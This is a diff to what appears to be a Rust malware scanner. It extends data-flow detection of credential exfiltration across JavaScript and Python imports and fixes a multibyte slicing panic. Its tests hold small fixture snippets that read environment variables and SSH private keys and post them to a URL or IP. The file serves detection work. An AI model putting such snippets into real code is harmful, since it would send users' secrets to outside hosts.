@@ -24,18 +24,22 @@
 //! process sink the summaries read setuptools' `download_svn(url)` and a
 //! `curl` wrapper as running what was fetched.
 //!
+//! A call into another file is followed over one relative import
+//! (`cross_file`): a function the file it names returns a secret from, or
+//! hands a parameter to a network sink in.
+//!
 //! shortcut: one namespace per file and no scopes, so two functions that
 //! reuse a name share its taint; a value kept in a global by one function
-//! and read by another that the file defines first is lost, and so is a
-//! call into another file. Move to a real parser (tree-sitter) if that
-//! over- or under-reaches. A first version that ignored statement order
+//! and read by another that the file defines first is lost. Move to a real
+//! parser (tree-sitter) if that over- or under-reaches, here or across
+//! files. A first version that ignored statement order
 //! flagged 53 of 526 clean packages (`process.env` in a fork option, then
 //! an unrelated `.send()`).
 
 use crate::correlate::{CREDENTIAL_EXFIL, DOWNLOAD_EXECUTE};
 use crate::RuleMatch;
 use regex::Regex;
-use std::collections::HashMap;
+use std::collections::{HashMap, HashSet};
 use std::sync::LazyLock;
 
 #[derive(Clone, Copy, PartialEq, Eq, Hash, Debug)]
@@ -83,6 +87,7 @@ struct Func {
 
 /// A function of the file that passes one of its parameters to a network
 /// sink.
+#[derive(Clone)]
 struct SinkFunc {
     call: Regex,
     name: String,
@@ -91,6 +96,7 @@ struct SinkFunc {
 }
 
 /// What the walk knows about the file besides the statements.
+#[derive(Clone)]
 struct Cx<'a> {
     raw_http: bool,
     /// A call that makes a network client (`https.request(`, `httpx.Client(`)
@@ -106,6 +112,9 @@ struct Cx<'a> {
     /// Functions that return a secret or a download: name, a call of it,
     /// what comes back.
     returns: Vec<(String, Regex, Kind, Origin)>,
+    /// Functions of an imported file that return a secret (`cross_file`): a
+    /// call of one under the name it has here, what comes back.
+    imported: Vec<(Regex, Origin)>,
 }
 
 struct Hit {
@@ -267,19 +276,70 @@ const NOT_FUNCTIONS: &[&str] = &[
 /// Chains for one file, `Chain: Credential Exfiltration` and `Chain: Download
 /// and Execute`, the same names the proximity chains use.
 pub fn flows(rel_path: &str, content: &str) -> Vec<RuleMatch> {
+    let Some((stmts, cx)) = summary(rel_path, content) else {
+        return Vec::new();
+    };
+    let (hits, _) = walk(stmts.iter(), &mut Taint::new(), &cx);
+    hits.iter()
+        .map(|h| flow(rel_path, h.name, &h.origin, h.line, &h.sink))
+        .collect()
+}
+
+const JS_EXTENSIONS: &[&str] = &[".js", ".mjs", ".cjs", ".ts", ".mts", ".cts", ".jsx", ".tsx"];
+
+/// Whether the file is Python; None when it is neither Python nor JS/TS.
+fn is_python(rel_path: &str) -> Option<bool> {
     let lower = rel_path.to_ascii_lowercase();
-    let python = lower.ends_with(".py");
-    let js = [".js", ".mjs", ".cjs", ".ts", ".jsx", ".tsx"]
-        .iter()
-        .any(|e| lower.ends_with(e));
-    if !python && !js {
-        return Vec::new();
+    if lower.ends_with(".py") || lower.ends_with(".pyw") {
+        return Some(true);
     }
-    // A 300 KB bundle chunk reuses `res` and `result` in hundreds of
-    // functions (lerna); the scripts this is for are a few KB.
-    const MAX_BYTES: usize = 64 * 1024;
-    if content.len() > MAX_BYTES || content.lines().any(|l| l.len() > 4000) {
-        return Vec::new();
+    JS_EXTENSIONS
+        .iter()
+        .any(|e| lower.ends_with(e))
+        .then_some(false)
+}
+
+/// A 300 KB bundle chunk reuses `res` and `result` in hundreds of functions
+/// (lerna); the scripts this is for are a few KB.
+pub const MAX_BYTES: usize = 64 * 1024;
+
+/// A large or minified file, left to the proximity chains.
+fn too_large(content: &str) -> bool {
+    content.len() > MAX_BYTES || content.lines().any(|l| l.len() > 4000)
+}
+
+/// Whether a statement of the file names what a secret is read from (the
+/// environment other than one variable of it, a path in `SECRET_PATH`), and
+/// whether one calls a network sink: without the first no function of the
+/// file returns a secret, without the second none is a wrapper around a
+/// sink. On the statements, where the walk looks: a comment inside
+/// `process/**/.env` is gone there.
+fn reads_and_sends(rel_path: &str, content: &str) -> (bool, bool) {
+    let Some(python) = is_python(rel_path).filter(|_| !too_large(content)) else {
+        return (false, false);
+    };
+    let (stmts, _) = statements(content, python);
+    let sink: &Regex = if python { &NET_SINK_PY } else { &NET_SINK_JS };
+    let raw_http = !python && RAW_HTTP.is_match(content);
+    let env = |t: &str| {
+        (t.contains("process.env") || t.contains("os.environ"))
+            && mentions(&code_only(t)).iter().any(|(name, how, _)| {
+                matches!(name.as_str(), "process.env" | "os.environ") && *how != Mention::Pick
+            })
+    };
+    let any = |found: &dyn Fn(&str) -> bool| stmts.iter().any(|s| found(&s.text));
+    (
+        any(&|t| env(t) || SECRET_PATH.is_match(t)),
+        any(&|t| sink.is_match(t) || (raw_http && STREAM_SINK.is_match(t))),
+    )
+}
+
+/// The statements of a file and its summaries; None for a file the pass
+/// does not read.
+fn summary(rel_path: &str, content: &str) -> Option<(Vec<Stmt>, Cx<'static>)> {
+    let python = is_python(rel_path)?;
+    if too_large(content) {
+        return None;
     }
     let (stmts, funcs) = statements(content, python);
     let client: &Regex = if python { &HTTP_CLIENT_PY } else { &RAW_HTTP };
@@ -298,7 +358,7 @@ pub fn flows(rel_path: &str, content: &str) -> Vec<RuleMatch> {
         })
         .collect();
     let mut cx = Cx {
-        raw_http: js && RAW_HTTP.is_match(content),
+        raw_http: !python && RAW_HTTP.is_match(content),
         client,
         receivers,
         net_sink: if python { &NET_SINK_PY } else { &NET_SINK_JS },
@@ -306,12 +366,249 @@ pub fn flows(rel_path: &str, content: &str) -> Vec<RuleMatch> {
         sink_funcs: Vec::new(),
         passers: Vec::new(),
         returns: Vec::new(),
+        imported: Vec::new(),
     };
     summarize(&stmts, &funcs, &mut cx);
-    let (hits, _) = walk(stmts.iter(), &mut Taint::new(), &cx);
-    hits.iter()
-        .map(|h| flow(rel_path, h.name, &h.origin, h.line, &h.sink))
+    Some((stmts, cx))
+}
+
+/// `const c = require('./x')`, `const { f, g: h } = require('./x')`,
+/// `const f = require('./x').f`. Groups: the name or the list, the path,
+/// the member. Relative paths only: `require('collect')` is a package.
+static JS_REQUIRE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"(?:const|let|var)\s+([\w$]+|\{[^{}]*\})\s*=\s*require\s*\(\s*['"](\.{1,2}/[^'"\n]+)['"]\s*\)(\.[\w$]+)?"#)
+        .unwrap()
+});
+/// `import c from './x'`, `import * as c from './x'`, `import { f, g as h }
+/// from './x'`. Groups: the default name, the namespace, the list, the path.
+static JS_IMPORT: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"\bimport\s+(?:([\w$]+)\s*,?\s*)?(?:\*\s*as\s+([\w$]+)|(\{[^{}]*\}))?\s*from\s*['"](\.{1,2}/[^'"\n]+)['"]"#)
+        .unwrap()
+});
+/// `from .x import f, g as h`, `from pkg.x import (f, g)`, `from . import x`.
+/// Groups: the dots, the module, the list.
+static PY_FROM: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"(?m)^\s*from\s+(\.*)([\w.]*)\s+import\s+(\([^()]*\)|[^\n#;]+)").unwrap()
+});
+/// `import x`, `import pkg.x as y`.
+static PY_IMPORT: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"(?m)^\s*import\s+([\w.]+)(?:\s+as\s+(\w+))?\s*(?:#.*)?$").unwrap()
+});
+
+/// `a`, `a as b`, `a: b` of an import list: the name there, the name here.
+fn import_names(list: &str) -> Vec<(String, String)> {
+    let word = |c: char| c.is_alphanumeric() || c == '_' || c == '$';
+    list.split(',')
+        .filter_map(|item| {
+            let mut words = item.split(|c: char| !word(c)).filter(|w| !w.is_empty());
+            let name = words.next()?;
+            let local = words.rfind(|w| *w != "as").unwrap_or(name);
+            Some((name.to_string(), local.to_string()))
+        })
         .collect()
+}
+
+/// `spec` (`./lib/x`, `../x`, `pkg/x`) under the directory `dir`, as a
+/// root-relative path; None above the root.
+fn resolve(dir: &[&str], spec: &str) -> Option<String> {
+    let mut parts = dir.to_vec();
+    for seg in spec.split('/') {
+        match seg {
+            "" | "." => {}
+            ".." => {
+                parts.pop()?;
+            }
+            s => parts.push(s),
+        }
+    }
+    Some(parts.join("/"))
+}
+
+/// The scanned file an import of `base` loads: the path as written (JS), with
+/// an extension, or the `index` / `__init__` of a directory.
+fn module_file(base: &str, python: bool, known: &HashSet<&str>) -> Option<String> {
+    let exts: &[&str] = if python { &[".py"] } else { JS_EXTENSIONS };
+    let index = if python { "/__init__" } else { "/index" };
+    let exact = (!python).then(|| base.to_string());
+    let file = exts.iter().map(|e| format!("{base}{e}"));
+    let dir = exts.iter().map(|e| format!("{base}{index}{e}"));
+    let mut tried = exact.into_iter().chain(file).chain(dir);
+    tried.find(|p| known.contains(p.as_str()))
+}
+
+/// What the file at `path` imports from the files in `known`: the file, the
+/// function's name there (None: the module, its functions are called as
+/// `here.f(`), the name here.
+/// shortcut: a module that is one function (`module.exports = f`, `export
+/// default`), a re-export, `require` of a variable and TypeScript's `./x.js`
+/// for `x.ts` are not followed; add them if a sample needs one.
+fn imports(
+    path: &str,
+    content: &str,
+    python: bool,
+    known: &HashSet<&str>,
+) -> Vec<(String, Option<String>, String)> {
+    let mut dir: Vec<&str> = path.split('/').collect();
+    dir.pop();
+    let mut out = Vec::new();
+    let mut bind = |file: Option<String>, name: Option<&str>, local: &str| {
+        if let Some(file) = file.filter(|f| f != path) {
+            out.push((file, name.map(str::to_string), local.to_string()));
+        }
+    };
+    if python {
+        // `.x` is beside this file and each further dot one directory up;
+        // `pkg.x` is under a directory above this file, the nearest first.
+        let locate = |dots: usize, module: &str| {
+            let sub = module.replace('.', "/");
+            let tops = match dots {
+                0 => 0..=dir.len(),
+                _ => {
+                    let top = (dir.len() + 1).checked_sub(dots)?;
+                    top..=top
+                }
+            };
+            tops.rev()
+                .find_map(|k| module_file(&resolve(&dir[..k], &sub)?, true, known))
+        };
+        for c in PY_FROM.captures_iter(content) {
+            let (dots, module) = (c[1].len(), &c[2]);
+            for (name, local) in import_names(&c[3]) {
+                // A function of the module, or a module of the package.
+                bind(locate(dots, module), Some(&name), &local);
+                bind(locate(dots, &format!("{module}.{name}")), None, &local);
+            }
+        }
+        for c in PY_IMPORT.captures_iter(content) {
+            let local = c.get(2).map_or(&c[1], |m| m.as_str());
+            bind(locate(0, &c[1]), None, local);
+        }
+        return out;
+    }
+    let locate = |spec: &str| module_file(&resolve(&dir, spec)?, false, known);
+    for c in JS_REQUIRE.captures_iter(content) {
+        let file = locate(&c[2]);
+        match (c[1].starts_with('{'), c.get(3)) {
+            (false, None) => bind(file, None, &c[1]),
+            (false, Some(member)) => bind(file, Some(&member.as_str()[1..]), &c[1]),
+            (true, None) => {
+                for (name, local) in import_names(&c[1]) {
+                    bind(file.clone(), Some(&name), &local);
+                }
+            }
+            (true, Some(_)) => {}
+        }
+    }
+    for c in JS_IMPORT.captures_iter(content) {
+        let file = locate(&c[4]);
+        for module in [c.get(1), c.get(2)].into_iter().flatten() {
+            bind(file.clone(), None, module.as_str());
+        }
+        for (name, local) in c.get(3).map_or(Vec::new(), |m| import_names(m.as_str())) {
+            bind(file.clone(), Some(&name), &local);
+        }
+    }
+    out
+}
+
+/// Credential flows that cross one import, which `flows` cannot see: a
+/// function of an imported file that returns a secret, its result reaching a
+/// network sink here (`const c = require('./lib/collect'); fetch(u, { body:
+/// c.all() })`). The same summaries and the same walk as inside one file;
+/// one import deep, so what the imported file imports is not followed. Not
+/// the other way round, a secret read here handed to an imported wrapper
+/// around a request: it flagged an agent runtime that hands its environment
+/// to the session host it starts (four releases of `local-operator`,
+/// ruleset 2026.11.16).
+///
+/// `paths`: the files the scan reads as code, root-relative with `/`;
+/// `read`: the text of one, None to leave it out. Every file is read once
+/// to find its imports, and an imported file at most twice more.
+pub fn cross_file(paths: &[&str], read: impl Fn(&str) -> Option<String>) -> Vec<RuleMatch> {
+    let known: HashSet<&str> = paths.iter().copied().collect();
+    // `reads_and_sends` and the summary per file, each worked out once. A
+    // summary costs what the file's own data-flow pass does, and making one
+    // of every imported file took longer than the scan before it: so only
+    // where a file imports a source or a sink and the other is there too,
+    // in it or in what it imports.
+    let mut text: HashMap<String, (bool, bool)> = HashMap::new();
+    let mut summaries: HashMap<String, Option<Cx<'static>>> = HashMap::new();
+    let mut out = Vec::new();
+    for path in paths {
+        let Some(python) = is_python(path) else {
+            continue;
+        };
+        let Some(content) = read(path) else {
+            continue;
+        };
+        let bound = imports(path, &content, python, &known);
+        let mut theirs = false;
+        for (file, ..) in &bound {
+            let (reads, _) = *text.entry(file.clone()).or_insert_with(|| {
+                read(file).map_or((false, false), |c| reads_and_sends(file, &c))
+            });
+            theirs |= reads;
+        }
+        if !theirs {
+            continue;
+        }
+        let own = text.entry(path.to_string());
+        if !own.or_insert_with(|| reads_and_sends(path, &content)).1 {
+            continue;
+        }
+        let mut returns = Vec::new();
+        for (file, name, local) in &bound {
+            if !text[file].0 {
+                continue;
+            }
+            let module = summaries
+                .entry(file.clone())
+                .or_insert_with(|| Some(summary(file, &read(file)?)?.1));
+            let Some(module) = module else {
+                continue;
+            };
+            // A call of the module's function `f` in this file. `\)?`:
+            // TypeScript's output calls it as `(0, c.f)()`.
+            let call = |f: &str| {
+                let callee = match name {
+                    Some(name) if name == f => regex::escape(local),
+                    Some(_) => return None,
+                    None => regex::escape(&format!("{local}.{f}")),
+                };
+                Regex::new(&format!(r"(?:^|[^\w$.]){callee}\)?\s*\(")).ok()
+            };
+            for (f, _, kind, origin) in &module.returns {
+                if let (Kind::Secret, Some(called)) = (kind, call(f)) {
+                    let mut origin = origin.clone();
+                    origin.what = format!("{} in {file}", origin.what);
+                    returns.push((called, origin));
+                }
+            }
+        }
+        if returns.is_empty() {
+            continue;
+        }
+        let own = summaries
+            .entry(path.to_string())
+            .or_insert_with(|| Some(summary(path, &content)?.1));
+        let Some(mut cx) = own.clone() else {
+            continue;
+        };
+        let theirs: Vec<String> = returns.iter().map(|(_, o)| o.what.clone()).collect();
+        // Added after the file's own summaries: a function here that returns
+        // what an imported one gave it would be a second level.
+        cx.imported = returns;
+        let (stmts, _) = statements(&content, python);
+        let (hits, _) = walk(stmts.iter(), &mut Taint::new(), &cx);
+        // The file's first flow, when an import is one end of it: a flow
+        // inside the file is `flows`' finding.
+        let first = hits.iter().find(|h| h.name == CREDENTIAL_EXFIL);
+        let crosses = |h: &&Hit| theirs.contains(&h.origin.what);
+        if let Some(h) = first.filter(crosses) {
+            out.push(flow(path, h.name, &h.origin, h.line, &h.sink));
+        }
+    }
+    out
 }
 
 /// Statements in order: a sink sees only what earlier statements tainted.
@@ -502,10 +799,7 @@ fn without_child_env(rhs: &str) -> String {
 /// file is not seen; follow the bindings if a stealer passes its socket around.
 fn on_client(text: &str, at: usize, cx: &Cx) -> bool {
     let head = text[..at].trim_end();
-    let start = head
-        .rfind(|c: char| !(c.is_alphanumeric() || "_$.".contains(c)))
-        .map_or(0, |p| p + 1);
-    let name = &head[start..];
+    let name = trailing_name(head);
     if name.is_empty() {
         // After a callback's block the call began in an earlier statement
         // (`https.request(o, () => {…}).end(body)`): not known, so it counts.
@@ -517,6 +811,14 @@ fn on_client(text: &str, at: usize, cx: &Cx) -> bool {
             .is_some_and(|rest| rest.is_empty() || rest.starts_with('.'))
     };
     ["requests", "httpx"].contains(&name) || cx.receivers.iter().any(bound)
+}
+
+/// The dotted name `head` ends with: `x = s.client` gives `s.client`. Sliced
+/// one byte after the character in front of it, a `；` there (three bytes)
+/// panicked, and the file kept one scanner-error finding for all its others.
+fn trailing_name(head: &str) -> &str {
+    let name = |c: char| c.is_alphanumeric() || "_$.".contains(c);
+    &head[head.trim_end_matches(name).len()..]
 }
 
 /// Fills `cx.sink_funcs` and `cx.returns`: each function's statements are
@@ -753,6 +1055,23 @@ fn carried(
         .filter(|(_, call, ..)| call.is_match(text))
         .map(|(_, _, kind, origin)| (*kind, origin.clone()))
         .collect();
+    // A function of an imported file. The environment it returns counts
+    // where a name holding it would: `getEnv().PORT` and `baseUrl(getEnv())`
+    // are one setting. Stricter than for a function of this file, which
+    // config modules do not export.
+    found.extend(cx.imported.iter().filter_map(|(call, origin)| {
+        let open = call.find(&code)?.end() - 1;
+        let mut origin = origin.clone();
+        if origin.alias {
+            let after = open + call_args(&code, open).len() + 2;
+            let outside = around(&code, open, &cx.passers);
+            if outside == Around::Opaque || FIELD_READ.is_match(code.get(after..).unwrap_or("")) {
+                return None;
+            }
+            origin.alias = outside == Around::Top;
+        }
+        Some((Kind::Secret, origin))
+    }));
     found.extend(found_in.iter().filter_map(|(name, mention, at)| {
         let (kind, origin) = taint.get(name)?;
         if *kind == Kind::Download && STATUS.is_match(&code[at + name.len()..]) {
@@ -862,10 +1181,7 @@ fn around(code: &str, at: usize, passers: &[String]) -> Around {
                 if head.ends_with([']', ')']) {
                     return Around::Opaque;
                 }
-                let start = head
-                    .rfind(|c: char| !(c.is_alphanumeric() || "_$.".contains(c)))
-                    .map_or(0, |p| p + 1);
-                let callee = head[start..].rsplit('.').next().unwrap_or_default();
+                let callee = trailing_name(head).rsplit('.').next().unwrap_or_default();
                 // Grouping, a keyword before the parenthesis or a copy of the
                 // value: look further out.
                 if callee.is_empty() || NOT_FUNCTIONS.contains(&callee) || COPIERS.contains(&callee)
@@ -1830,5 +2146,204 @@ print("send os.environ to the server")  # data = os.environ
         );
         let js = "const { spawn } = require('child_process');\nconst child = spawn('npm', ['test'], { env: { ...process.env, CI: '1' } });\nconst text = await (await fetch(u)).text();\nconst m = /x(\\d+)/.exec(text);\nfetch(api, { headers: { auth: process.env.TOKEN } });\n";
         assert!(names("a.js", js).is_empty(), "{:?}", flows("a.js", js));
+    }
+
+    /// Both callers of `trailing_name`: the receiver of a method and the
+    /// callee around a value, each right after a three-byte character.
+    #[test]
+    fn multibyte_char_before_a_name_is_not_sliced_into() {
+        let py = "import os, requests\nsecret = os.environ\nx = 1；requests.post(\"http://198.51.100.23/x\", data=secret)\n";
+        assert_eq!(names("a.py", py), [CREDENTIAL_EXFIL]);
+        let js = "const t = process.env.NPM_TOKEN;\nconst x = 1；wrap(t);\n";
+        assert!(names("a.js", js).is_empty());
+    }
+
+    /// `cross_file` over files held in memory: (file, line, context).
+    fn crossing(files: &[(&str, &str)]) -> Vec<(String, usize, String)> {
+        let paths: Vec<&str> = files.iter().map(|(path, _)| *path).collect();
+        let read = |path: &str| {
+            let file = files.iter().find(|(p, _)| *p == path);
+            file.map(|(_, src)| src.to_string())
+        };
+        cross_file(&paths, read)
+            .into_iter()
+            .map(|m| {
+                assert_eq!(m.matched_pattern, CREDENTIAL_EXFIL);
+                (m.file_path, m.line_number, m.context)
+            })
+            .collect()
+    }
+
+    #[test]
+    fn a_file_is_summarised_for_others_only_with_a_source_or_a_sink() {
+        for (path, src, expected) in [
+            ("config.js", "module.exports = { port: process.env.PORT, host: process.env['HOST'] };\n", (false, false)),
+            ("env.js", "const child = { ...process.env, CI: '1' };\n", (true, false)),
+            ("keys.py", "key = open(os.path.expanduser('~/.ssh/id_rsa')).read()\nport = os.environ.get('PORT')\n", (true, false)),
+            ("api.js", "const r = await fetch(base + '/health');\n", (false, true)),
+            ("raw.js", "const req = https.request(opts);\nreq.write(body);\n", (false, true)),
+            ("log.js", "process.stdout.write(text);\n", (false, false)),
+            ("notes.txt", "fetch(u, { body: JSON.stringify(process.env) })\n", (false, false)),
+        ] {
+            assert_eq!(reads_and_sends(path, src), expected, "{path}");
+        }
+    }
+
+    const COLLECT_JS: &str = "const fs = require('fs');\nfunction all() {\n  return { env: process.env, key: fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8') };\n}\nmodule.exports = { all };\n";
+    const COLLECT_PY: &str =
+        "import os\n\ndef grab():\n    found = dict(os.environ)\n    return found\n";
+
+    #[test]
+    fn a_secret_returned_by_an_imported_function_reaches_a_sink() {
+        let collect = ("lib/collect.js", COLLECT_JS);
+        for (path, src, line) in [
+            ("index.js", "const c = require('./lib/collect');\nfetch(URL, { method: 'POST', body: JSON.stringify(c.all()) });\n", 2),
+            ("index.js", "const { all: grab } = require('./lib/collect.js');\nconst data = grab();\nfetch(URL, { method: 'POST', body: JSON.stringify(data) });\n", 3),
+            ("index.js", "const all = require('./lib/collect').all;\naxios.post(URL, all());\n", 2),
+            ("index.mjs", "import { all as grab } from './lib/collect.js';\nawait fetch(URL, { method: 'POST', body: JSON.stringify(grab()) });\n", 2),
+            ("src/main.ts", "import * as c from '../lib/collect';\nasync function run() {\n  const data = c.all();\n  await fetch(URL, { method: 'POST', body: JSON.stringify(data) });\n}\n", 4),
+            ("src/main.ts", "import c from '../lib/collect';\nfetch(URL, { method: 'POST', body: JSON.stringify(c.all()) });\n", 2),
+            // TypeScript's output.
+            ("dist/index.js", "const collect_1 = require(\"../lib/collect\");\nconst data = (0, collect_1.all)();\nfetch(URL, { method: 'POST', body: JSON.stringify(data) });\n", 3),
+            // A wrapper of this file around the sink.
+            ("index.js", "const c = require('./lib/collect');\nfunction send(body) {\n  return fetch(URL, { method: 'POST', body });\n}\nsend(JSON.stringify(c.all()));\n", 5),
+        ] {
+            let found = crossing(&[collect, (path, src)]);
+            assert_eq!(found.len(), 1, "{path}: {found:?}");
+            assert_eq!((found[0].0.as_str(), found[0].1), (path, line), "{src}");
+            assert!(
+                found[0].2.contains("process.env in lib/collect.js (line 3)"),
+                "{}",
+                found[0].2
+            );
+        }
+        // A directory's `index`.
+        let index = [
+            ("lib/collect/index.js", COLLECT_JS),
+            ("main.js", "const c = require('./lib/collect');\nfetch(URL, { method: 'POST', body: JSON.stringify(c.all()) });\n"),
+        ];
+        assert_eq!(crossing(&index).len(), 1);
+        // A comment inside the names is no cover: it is gone where the walk
+        // looks, and where `reads_and_sends` does.
+        let split = [
+            ("lib/collect.js", "function all() {\n  return { env: process/**/.env };\n}\nmodule.exports = { all };\n"),
+            ("main.js", "const c = require('./lib/collect');\nfetch/**/(URL, { method: 'POST', body: JSON.stringify(c.all()) });\n"),
+        ];
+        assert_eq!(crossing(&split).len(), 1);
+    }
+
+    #[test]
+    fn a_secret_returned_by_an_imported_python_function_reaches_a_sink() {
+        for (path, src) in [
+            ("pkg/__init__.py", "import requests\nfrom .collect import grab\nrequests.post(URL, json=grab())\n"),
+            ("pkg/__init__.py", "import requests\nfrom . import collect\ndata = collect.grab()\nrequests.post(URL, json=data)\n"),
+            ("pkg/sub/run.py", "import requests\nfrom ..collect import (\n    grab as g,\n)\nrequests.post(URL, json=g())\n"),
+            ("pkg/main.py", "import requests\nimport collect as c\nrequests.post(URL, json=c.grab())\n"),
+            ("setup.py", "import requests\nfrom pkg.collect import grab\nrequests.post(URL, json=grab())\n"),
+            ("setup.py", "import requests\nimport pkg.collect\nrequests.post(URL, json=pkg.collect.grab())\n"),
+            ("setup.py", "import requests\nfrom pkg import collect\nrequests.post(URL, json=collect.grab())\n"),
+        ] {
+            let found = crossing(&[("pkg/collect.py", COLLECT_PY), (path, src)]);
+            assert_eq!(found.len(), 1, "{path}: {src} {found:?}");
+            assert_eq!(found[0].0, path);
+            assert!(
+                found[0].2.contains("os.environ in pkg/collect.py (line 4)"),
+                "{}",
+                found[0].2
+            );
+        }
+        // A function of the package's `__init__`.
+        let init = [
+            ("pkg/__init__.py", COLLECT_PY),
+            (
+                "pkg/run.py",
+                "import requests\nfrom . import grab\nrequests.post(URL, json=grab())\n",
+            ),
+        ];
+        assert_eq!(crossing(&init).len(), 1);
+    }
+
+    #[test]
+    fn a_secret_handed_to_an_imported_wrapper_is_not_followed() {
+        // Measured and dropped (ruleset 2026.11.16): an agent runtime hands
+        // its environment to the session host it starts through a wrapper
+        // in another file, and four of its releases were flagged.
+        let net = "function send(tag, data) {\n  return fetch(URL + tag, { method: 'POST', body: data });\n}\nmodule.exports = { send };\n";
+        let js = "const net = require('./lib/net');\nconst key = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'), 'utf8');\nnet.send('k', key);\n";
+        assert!(crossing(&[("lib/net.js", net), ("index.js", js)]).is_empty());
+        let net = "import requests\n\ndef send(data):\n    requests.post(URL, json=data)\n";
+        let py = "import os\nfrom .net import send\nsend(dict(os.environ))\n";
+        assert!(crossing(&[("pkg/net.py", net), ("pkg/__init__.py", py)]).is_empty());
+    }
+
+    #[test]
+    fn an_import_without_a_flow_is_no_finding() {
+        let collect = ("lib/collect.js", COLLECT_JS);
+        for (path, src) in [
+            // The secret is used here and something else is sent.
+            ("index.js", "const c = require('./lib/collect');\nconst data = c.all();\nfs.writeFileSync(out, JSON.stringify(data));\nfetch(URL, { method: 'POST', body: JSON.stringify({ ok: true }) });\n"),
+            // A package of that name, not the file.
+            ("index.js", "const c = require('collect');\nfetch(URL, { method: 'POST', body: JSON.stringify(c.all()) });\n"),
+            ("lib/index.js", "import { all } from 'collect';\nfetch(URL, { method: 'POST', body: JSON.stringify(all()) });\n"),
+            // Another function of the file, a path above the root, a member
+            // of a member.
+            ("index.js", "const { other } = require('./lib/collect');\nfetch(URL, { method: 'POST', body: JSON.stringify(other()) });\n"),
+            ("index.js", "const c = require('../lib/collect');\nfetch(URL, { method: 'POST', body: JSON.stringify(c.all()) });\n"),
+            ("index.js", "const { all } = require('./lib/collect').tools;\nfetch(URL, { method: 'POST', body: JSON.stringify(all()) });\n"),
+            // One setting of what came back.
+            ("index.js", "const c = require('./lib/env');\nfetch(c.getEnv().API_URL + '/health');\n"),
+            ("index.js", "const { getEnv } = require('./lib/env');\nconst base = baseUrl(getEnv());\nfetch(base + '/health');\n"),
+            ("index.js", "const { getEnv } = require('./lib/env');\nconst env = getEnv();\nfetch(env.API_URL, { headers: { auth: env['TOKEN'] } });\n"),
+            // A function here that passes the secret on is a second level.
+            ("index.js", "const c = require('./lib/collect');\nfunction relay() {\n  return c.all();\n}\nfetch(URL, { method: 'POST', body: JSON.stringify(relay()) });\n"),
+        ] {
+            let env = "function getEnv() {\n  return process.env;\n}\nmodule.exports = { getEnv };\n";
+            let files = [collect, ("collect.js", COLLECT_JS), ("lib/env.js", env), (path, src)];
+            let found = crossing(&files);
+            assert!(found.is_empty(), "{src}: {found:?}");
+        }
+        // The whole of what `getEnv` returned still counts.
+        let whole = "const { getEnv } = require('./lib/env');\nfetch(URL, { method: 'POST', body: JSON.stringify(getEnv()) });\n";
+        let env = "function getEnv() {\n  return process.env;\n}\nmodule.exports = { getEnv };\n";
+        assert_eq!(
+            crossing(&[("lib/env.js", env), ("index.js", whole)]).len(),
+            1
+        );
+        // A function of the same name that returns no secret, and settings
+        // read from the environment one by one.
+        let index = "const c = require('./lib/collect');\nconst config = require('./config');\nfetch(`http://${config.host}:${config.port}/hook`, { method: 'POST', body: JSON.stringify(c.all()) });\nfetch(config.load().url, { method: 'POST', body: JSON.stringify(config.load()) });\n";
+        let files = [
+            ("lib/collect.js", "function all() {\n  return { name: pkg.name, version: pkg.version };\n}\nmodule.exports = { all };\n"),
+            ("config.js", "function load() {\n  return { port: process.env.PORT, url: process.env.API_URL || 'https://example.com' };\n}\nmodule.exports = { port: process.env.PORT, host: process.env.HOST, load };\n"),
+            ("index.js", index),
+        ];
+        assert!(crossing(&files).is_empty(), "{:?}", crossing(&files));
+        // What the imported file imports is not followed.
+        let files = [
+            collect,
+            ("lib/relay.js", "const c = require('./collect');\nfunction relay() {\n  return c.all();\n}\nmodule.exports = { relay, all: c.all };\n"),
+            ("index.js", "const r = require('./lib/relay');\nfetch(URL, { method: 'POST', body: JSON.stringify([r.relay(), r.all()]) });\n"),
+        ];
+        assert!(crossing(&files).is_empty(), "{:?}", crossing(&files));
+        // A flow inside the importing file is `flows`' finding, reported once.
+        let own = "const c = require('./lib/collect');\nfetch(URL, { method: 'POST', body: JSON.stringify(process.env) });\nfetch(URL, { method: 'POST', body: JSON.stringify(c.all()) });\n";
+        assert!(crossing(&[collect, ("index.js", own)]).is_empty());
+        assert_eq!(names("index.js", own), vec![CREDENTIAL_EXFIL]);
+        // An imported file that is not read (too large, not scanned).
+        let index = "const c = require('./lib/collect');\nfetch(URL, { method: 'POST', body: JSON.stringify(c.all()) });\n";
+        let found = cross_file(&["lib/collect.js", "index.js"], |path| {
+            (path == "index.js").then(|| index.to_string())
+        });
+        assert!(found.is_empty());
+        // Python: a module of another package, and the secret not sent.
+        for src in [
+            "import requests\nfrom other.collect import grab\nrequests.post(URL, json=grab())\n",
+            "import requests\nfrom ...collect import grab\nrequests.post(URL, json=grab())\n",
+            "import requests\nfrom .collect import grab\nenv = grab()\nsubprocess.run(cmd, env=env)\nrequests.post(URL, json={'ok': True})\n",
+            "import requests\nfrom .collect import grab\nrequests.post(grab().get('API_URL'), json={'ok': True})\n",
+        ] {
+            let found = crossing(&[("pkg/collect.py", COLLECT_PY), ("pkg/main.py", src)]);
+            assert!(found.is_empty(), "{src}: {found:?}");
+        }
     }
 }
